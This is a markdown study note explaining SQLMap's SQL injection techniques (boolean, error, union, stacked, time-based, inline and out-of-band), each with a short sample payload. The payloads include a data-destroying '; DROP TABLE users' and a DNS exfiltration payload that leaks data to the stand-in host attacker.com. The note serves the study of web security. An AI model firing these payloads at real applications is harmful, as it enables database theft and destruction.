# SQLMap
---
SQLMap is a tool that automates the process of finding SQL injection vulnerabilities.
Detailed information can be found in the [wiki](https://github.com/sqlmapproject/sqlmap/wiki/Usage).

## Injection types
---
The different injection types (or techniques) are referred to as `BEUSTQ` which stands for

- `B`: Boolean-based blind
- `E`: Error-based
- `U`: Union query-based
- `S`: Stacked queries
- `T`: Time-based blind
- `Q`: Inline queries


### Boolean-based blind
---
Basically just tests if
```sql
AND 1=1
```
works.


### Error-based
---
Is besides `UNION query-based` the fastest because it can retrieve a limited amount of date (chunks) through each request.


Example:
```sql
AND GTID_SUBSET(@@version,0)
```

How it works:
If the `database management system` (`DBMS`) errors are being returned as part of the server response for any database-related problems, then there is a probability that they can be used to carry the results for requested queries. In such cases, specialised payloads for the current DBMS are used, targeting the functions that cause known misbehaviours. SQLMap has the most comprehensive list of such related payloads.


### UNION query-based
---
Example:
```sql
UNION ALL SELECT 1,@@version,3
```

With the usage of `UNION`, it is generally possible to extend the original (`vulnerable`) query with the injected statements' results. This way, if the original query results are rendered as part of the response, the attacker can get additional results from the injected statements within the page response itself. This type of SQL injection is considered the fastest, as, in the ideal scenario, the attacker would be able to pull the content of the whole database table of interest with a single request.


### Stacked queries
---
Example:
```sql
; DROP TABLE users
```

Basically adding additional SQL statements after the vulnerable one.

Stacking SQL queries, also known as the "piggy-backing," is the form of injecting additional SQL statements after the vulnerable one. In case that there is a requirement for running non-query statements (e.g. `INSERT`, `UPDATE` or `DELETE`), stacking must be supported by the vulnerable platform (e.g., `Microsoft SQL Server` and `PostgreSQL` support it by default). SQLMap can use such vulnerabilities to run non-query statements executed in advanced features (e.g., execution of OS commands) and data retrieval similarly to time-based blind SQLi types.


### Time-based blind SQL Injection
---
Example:
```sql
AND 1=IF(2>1,SLEEP(5),0)
```


The principle of `Time-based blind SQL Injection` is similar to the `Boolean-based blind SQL Injection`, but here the response time is used as the source for the differentiation between `TRUE` or `FALSE`.

- `TRUE` response is generally characterised by the noticeable difference in the response time compared to the regular server response
    
- `FALSE` response should result in a response time indistinguishable from regular response times
    

`Time-based blind SQL Injection` is considerably slower than the boolean-based blind SQLi, since queries resulting in `TRUE` would delay the server response. This SQLi type is used in cases where `Boolean-based blind SQL Injection` is not applicable. For example, in case the vulnerable SQL statement is a non-query (e.g. `INSERT`, `UPDATE` or `DELETE`), executed as part of the auxiliary functionality without any effect to the page rendering process, time-based SQLi is used out of the necessity, as `Boolean-based blind SQL Injection` would not really work in this case.


### Inline queries
---
Example:
```sql
SELECT (SELECT @@version) from
```

This type of injection embedded a query within the original query. Such SQL injection is uncommon, as it needs the vulnerable web app to be written in a certain way. Still, SQLMap supports this kind of SQLi as well.


### Out-of-band SQL Injection
---
Example:
```sql
LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
```

This is considered one of the most advanced types of SQLi, used in cases where all other types are either unsupported by the vulnerable web application or are too slow (e.g., time-based blind SQLi). SQLMap supports out-of-band SQLi through "DNS exfiltration," where requested queries are retrieved through DNS traffic.

By running the SQLMap on the DNS server for the domain under control (e.g. `.attacker.com`), SQLMap can perform the attack by forcing the server to request non-existent subdomains (e.g. `foo.attacker.com`), where `foo` would be the SQL response we want to receive. SQLMap can then collect these erroring DNS requests and collect the `foo` part, to form the entire SQL response.



## Basic scenario
---
```bash
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
```
Where `--batch` skips any required user input, by automatically choosing using the default option.

